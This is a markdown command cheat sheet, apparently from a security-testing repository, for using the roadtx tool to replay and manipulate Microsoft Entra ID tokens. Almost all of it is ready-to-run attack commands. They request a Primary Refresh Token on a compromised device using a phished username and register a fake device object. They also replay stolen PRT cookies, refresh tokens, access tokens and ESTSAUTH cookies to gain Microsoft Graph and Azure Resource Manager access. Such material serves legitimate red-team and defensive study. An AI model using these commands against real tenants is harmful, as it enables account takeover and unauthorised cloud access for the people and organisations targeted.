# ROADtools Token eXchange (roadtx)

Collection of commands to replay and manipulate tokens with [roadtx](https://github.com/dirkjanm/ROADtools/wiki/ROADtools-Token-eXchange-(roadtx)).


**Table of contents**

- [Primary Refresh Token (PRT)](#prt)
- [Refresh token](#refreshtoken)
- [Access token](#accesstoken)
- [ESTSAUTH cookie](#estsauth)


## 📌 Requirements

- [Az PowerShell](https://learn.microsoft.com/en-us/powershell/azure/install-azps-windows?view=azps-11.2.0&tabs=powershell&pivots=windows-psgallery)
- [Global Cookie Manager](https://chromewebstore.google.com/detail/global-cookie-manager/bgffajlinmbdcileomeilpihjdgjiphb?hl=en-US&utm_source=ext_sidebar) extension for Chrome


## ⬇️ Install roadtx

### Create and activate a new Python virtual environment
```
python -m venv roadtx
```
```
.\roadtx\Scripts\activate
```

### Download geckodriver

[📌 Latest releases](https://github.com/mozilla/geckodriver/releases)

```
Invoke-WebRequest -Uri <uri_to_latest_release_file> -OutFile geckodriver.zip
```
```
Expand-Archive .\geckodriver.zip . -Force
```

### Install roadtx
```
pip install roadtx
```
```
roadtx -h
```

<a id='prt'></a>
##  💻 Primary Refresh Token (PRT)

### 📲 PRT via device enrollement

On the compromised device, request a new PRT as follows:

#### Get a refresh token for the Device Registration Service (DRS)
```
roadtx interactiveauth -u <phished_username> -c 29d9ed98-a469-4536-ade2-f981bc1d605e -r https://enrollment.manage.microsoft.com/ -d .\geckodriver.exe
```

#### Get an access token for DRS
```
roadtx.exe gettokens --refresh-token file -c 29d9ed98-a469-4536-ade2-f981bc1d605e -r drs
```

#### Join a fake device object to the account
```
roadtx device -a join -n legitdevice
```

#### Request a PRT
```
roadtx prt --refresh-token <insert_the_refresh_token_resulting_from_the_first_command> -c .\legitdevice.pem -k .\legitdevice.key
```

#### Request a refresh token for MS Graph using the PRT
```
roadtx prtauth -c azcli -r msgraph     
```

#### Request a refresh token for ARM using the PRT
```
roadtx prtauth -c azcli -r azrm     
```

### 🍪 PRT cookie

On the compromised device, request a new PRT cookie using [request_prt_cookie.py](https://github.com/emiliensocchi/azure-hunting/blob/main/Tools/roadtools/request_prt_cookie.py), and extract the value of the `x-ms-DeviceCredential` parameter:
```
python .\request_prt_cookie.py
```

#### Request a refresh and access token for MS Graph using the PRT cookie
```
roadtx gettokens --prt-cookie <stolen_cookie> -c azcli -r msgraph
```

#### Request a refresh and access token for ARM using the PRT cookie
```
roadtx gettokens --prt-cookie <stolen_cookie> -c azcli -r azrm
```


<a id='refreshtoken'></a>
## 🔄 Refresh tokens

### Request an access token for MS Graph using a stolen refresh token
```
roadtx gettokens --refresh-token <stolen_token> -c c44b4083-3bb0-49c1-b47d-974e53cbdf3c -r msgraph -ua chrome_windows --origin whatever
```

### Request an access token for ARM using a stolen refresh token
```
roadtx gettokens --refresh-token <stolen_token> -c c44b4083-3bb0-49c1-b47d-974e53cbdf3c -r azrm -ua chrome_windows --origin whatever
```


<a id='accesstoken'></a>
## 🔑Access tokens

### Import a stolen access token to the MS Graph PowerShell module
```
# audience: "https://graph.microsoft.com/"
$msgraphToken  = '' 
$secureToken = ConvertTo-SecureString -String $msgraphToken -AsPlainText -Force
Connect-MgGraph -AccessToken $secureToken 
```

### Import a stolen access token to the Az PowerShell module
```
# audience: "https://management.core.windows.net/"
$armToken = '<token>'
Connect-AzAccount -AccessToken $armToken -AccountId current
```


<a id='estsauth'></a>
## 🍪 ESTSAUTH cookie

### Request a refresh and access token for MS Graph using a stolen ESTSAUTH cookie:
```
roadtx interactiveauth --estscookie <stolen_cookie> -d .\geckodriver.exe -c azcli -r msgraph
```

### Request a refresh and access token for ARM using a stolen ESTSAUTH cookie:
```
roadtx interactiveauth --estscookie <stolen_cookie> -d .\geckodriver.exe -c azcli -r azrm
```
